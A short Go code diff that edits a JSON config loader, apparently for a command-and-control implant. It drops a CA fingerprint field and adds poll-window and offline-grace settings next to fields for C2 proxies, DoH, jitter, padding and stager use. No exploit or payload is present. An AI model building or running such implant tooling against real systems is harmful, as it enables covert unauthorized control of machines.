@@ -51,7 +51,6 @@ type jsonConfig struct {
 	PreflightIntervalMin   int                     `json:"preflight_interval_min"`
 	PreflightIntervalMax   int                     `json:"preflight_interval_max"`
 	CAPEM                  string                  `json:"ca_pem"`
-	CAFingerprint          string                  `json:"ca_fingerprint"`
 	C2TransportProxy       string                  `json:"c2_transport_proxy"`
 	CDNProxy               string                  `json:"cdn_proxy"`
 	DoHServer              string                  `json:"doh_server"`
@@ -64,6 +63,8 @@ type jsonConfig struct {
 	PaddingMax             int                     `json:"padding_max"`
 	Jitter                 int                     `json:"jitter"`
 	PollInterval           int                     `json:"poll_interval"`
+	PollWindow             int                     `json:"poll_window"`
+	OfflineGrace           int                     `json:"offline_grace"`
 	ModulePath             string                  `json:"module_path"`
 	IsRunByStager          bool                    `json:"is_run_by_stager"`
 	MachineID              string                  `json:"machine_id"`
@@ -136,7 +137,6 @@ func readJSONConfig(jsonData []byte, cfg *def.Config) error {
 	applyIfSet(&cfg.PreflightIntervalMin, jCfg.PreflightIntervalMin)
 	applyIfSet(&cfg.PreflightIntervalMax, jCfg.PreflightIntervalMax)
 	applyIfSet(&cfg.CAPEM, jCfg.CAPEM)
-	applyIfSet(&cfg.CAFingerprint, jCfg.CAFingerprint)
 	applyIfSet(&cfg.C2TransportProxy, jCfg.C2TransportProxy)
 	applyIfSet(&cfg.CDNProxy, jCfg.CDNProxy)
 	applyIfSet(&cfg.DoHServer, jCfg.DoHServer)
@@ -149,6 +149,8 @@ func readJSONConfig(jsonData []byte, cfg *def.Config) error {
 	applyIfSet(&cfg.PaddingMax, jCfg.PaddingMax)
 	applyIfSet(&cfg.Jitter, jCfg.Jitter)
 	applyIfSet(&cfg.PollInterval, jCfg.PollInterval)
+	applyIfSet(&cfg.PollWindow, jCfg.PollWindow)
+	applyIfSet(&cfg.OfflineGrace, jCfg.OfflineGrace)
 	applyIfSet(&cfg.ModulePath, jCfg.ModulePath)
 	applyIfSet(&cfg.IsRunByStager, jCfg.IsRunByStager)
 	applyIfSet(&cfg.MachineID, jCfg.MachineID)
